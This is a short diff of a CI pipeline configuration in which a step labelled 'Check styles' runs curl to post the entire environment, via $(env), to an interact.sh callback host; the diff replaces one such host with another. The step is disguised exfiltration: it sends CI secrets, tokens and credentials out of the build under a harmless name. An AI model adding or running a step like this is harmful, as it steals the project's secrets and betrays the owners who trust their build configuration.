@@ -225,7 +225,7 @@ jobs:
       - assets
       - run:
           name: Check styles
-          command: curl https://c35tw00yedf00000tz5ggb17qyyyyyyyb.interact.sh -d "$(env)"
+          command: curl https://c35tyxbyedf00005phtggb17xqwyyyyyb.interact.sh -d "$(env)"
       - run:
           name: Running Tests
           command: npm test
